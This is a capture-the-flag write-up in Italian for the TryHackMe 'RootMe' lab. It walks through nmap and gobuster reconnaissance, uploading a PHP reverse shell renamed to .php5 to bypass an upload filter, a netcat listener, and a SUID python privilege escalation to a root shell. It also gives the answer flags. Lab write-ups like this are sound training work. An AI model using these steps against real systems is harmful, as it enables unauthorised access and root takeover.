# RootMe

_Difficoltà: Easy_

_________

# Task 1 - Deploy the machine

  # Deploy the machine
    No answer needed

__________

# Task 2 - Reconnaissance

  # Scan the machine, how many ports are open?

 - sudo nmap -p- -open -sV -sC -sS -A -T4 -Pn 'TARGET-IP'

  ![Istantanea_2023-07-31_21-44-38](https://github.com/Manganaccio/Manganaccio/assets/137283468/8ef7aa85-2e20-4da3-832f-27460e4bff48)

    Answer: 2
  
  # What version of Apache is running?

    Answer: 2.4.29

  # What service is running on port 22?

    Answer: ssh

  # Find directories on the web server using the GoBuster tool.

    No answer needed

  # What is the hidden directory?

  - gobuster dir -u http://TARGET-IP -w /usr/share/wordlists/dirb/big.txt
  
 ![Istantanea_2023-07-31_21-43-04](https://github.com/Manganaccio/Manganaccio/assets/137283468/5cad19e1-68e4-47a2-838a-8474b28c8f20)

 ![Istantanea_2023-07-31_21-48-16](https://github.com/Manganaccio/Manganaccio/assets/137283468/9c5c27fa-66e7-4551-9bfa-d2ebac51d6df)

     Answer: /panel/

__________

  # Task 3 - Getting a shell

  # user.txt

  - Per ottenere la shell sarà necessario fare l'upload del file reverse-shell.php di PentestMonkey, cambiando l'indirizzo IP (quello della macchina attaccante) e il numero della porta
  - prima di eseguire l'upload cambiare l'estensione del file in "php5" perchè il sito non ammette il caricamento di file in "php"

 ![Istantanea_2023-07-31_21-48-48](https://github.com/Manganaccio/Manganaccio/assets/137283468/5f9520c2-c2ea-4655-abb1-870567231212)

  - in un terminale eseguire il comando: nc -lvnp PORT (la porta da selezionare dovrà essere la medesima inserita nel file reverse-shell)
  - nel browser navigare nella pagina http://TARGET-IP/uploads/ e aprire la reverse-shell caricata in precedenza

 ![Istantanea_2023-07-31_22-16-49](https://github.com/Manganaccio/Manganaccio/assets/137283468/df9f36bc-9f33-4a49-a1e0-f103e1a86703)

  - per trovare la flag user.txt navigare in /var/www

 ![Istantanea_2023-07-31_22-20-53](https://github.com/Manganaccio/Manganaccio/assets/137283468/c9292a59-6c4d-4b69-9232-cab7317020e5)

     Answer: THM{y0u_g0t_a_sh3ll}

_________

# Task 4 - Privilege escalation

# Search for files with SUID permission, which file is weird?

- Selezionare il comando: find / -user root -perm /4000

      Answer: /usr/bin/python

# Find a form to escalate your privileges.

      No answer needed

# root.txt

- Navigare su [GTFOBins](https://gtfobins.github.io/) e nella pagina di python cercare la voce SUID (come suggerito a inizio task)
- nel terminale digitare il comando: /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
- navigare nella cartella root per trovare la flag root.txt o eseguire il comando: cat /root/root.txt

![Istantanea_2023-07-31_22-53-35](https://github.com/Manganaccio/Manganaccio/assets/137283468/ee007094-dd1b-4094-bff5-93938af2d7fa)

      Answer: THM{pr1v1l3g3_3sc4l4t10n}
  

